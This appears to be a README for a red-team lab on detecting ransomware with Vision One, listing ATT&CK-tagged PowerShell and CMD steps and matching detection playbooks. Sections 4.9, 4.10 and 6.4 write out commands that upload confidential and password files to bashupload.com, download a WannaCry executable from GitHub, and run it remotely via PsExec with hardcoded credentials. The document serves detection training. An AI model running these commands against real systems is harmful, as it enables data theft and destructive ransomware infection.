# Tools-Red-Team
Threat Hunting using Vision One

Herramientas para evaluar un posible ataque Ransomware

4.1. Current User (T1033)	whoami

4.2. Find System Network Connections (T1049)	netstat -anto; Get-NetTCPConnection

4.3. Network Service Scanning (T1046)	Multiple computers within the network have exposed services on

4.4. View remote shares (T1135)	net view \\10.0.10.12 /all

4.5. Find files (T1005)	Get-ChildItem C:\ -Recurse -Include confidential.* -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5
	Get-ChildItem C:\ -Recurse -Include password.* -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5
 
4.6. Manual Command - (T1059)	Get-Content -Path  c:\confidential\confidential.txt

4.7. Net use (T1021.002)	net use \\10.0.10.12\confidential /user:trendmicro trendmicro;

4.8. Manual Command (T1083)	Get-ChildItem -Path \\10.0.10.12\confidential

4.9. Manual Command "Data Exfiltration" (T1041, T1055, T1572)	Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipart/form-data -Body \\10.0.10.12\confidential\confidential.txt
	Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipart/form-data -Body \\10.0.10.12\confidential\Passwords.txt

4.10. Manual Command Dropping a 0-day Ransomware! (T1486)	Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\Public\PSTools.zip"; Expand-Archive -Path "C:\Users\Public\PSTools.zip" -DestinationPath "C:\Users\Public\";
	Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile \\10.0.10.12\confidential\wcry.exe;
	CMD: C:\Users\Public\PsExec.exe -s -accepteula \\10.0.10.12 -u trendmicro -p trendmicro C:\confidential\wcry.exe
 
5.1. Custom Detection Model - Network and using PowerShell	Create Custom Detection Model: Network and using PowerShell

5.2. Custom Detection Model -  Sensitive data using PowerShell	Detecting an individual trying to upload: Sensitive data using PowerShell

5.3. Custom Detection Model - Ransomware Activity	Detecting Ransomware Activity (Compromised computer)

6.1. Security Playbook - Network Scan using Powershell	Detecting AND STOPPING an individual trying to scan for active computers on a network and using PowerShell scripts - Related to Lab 4.3

6.2. Security Playbooks - Sensitive Data Exfiltration	Detecting AND STOPPING an individual trying to upload sensitive data using PowerShell or other scripts - Related to Lab 4.9.

6.3. Security Playbooks - Ransomware Activity	Detecting and ISOLATING a compromised computer that was the victim of a Ransomware attack - Related to Lab 4.10

6.4 Automated Response - Security Playbook - Sensitive Data Exfiltration	"Run the following command using Caldera / Manual Command:

Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipart/form-data -Body \\10.0.10.12\confidential\confidential.txt"
	Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\Public\PSTools.zip"; Expand-Archive -Path "C:\Users\Public\PSTools.zip" -DestinationPath "C:\Users\Public\";
	Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile \\10.0.10.12\confidential\wcry.exe;
	CMD: C:\Users\Public\PsExec.exe -s -accepteula \\10.0.10.12 -u trendmicro -p trendmicro C:\confidential\wcry.exe

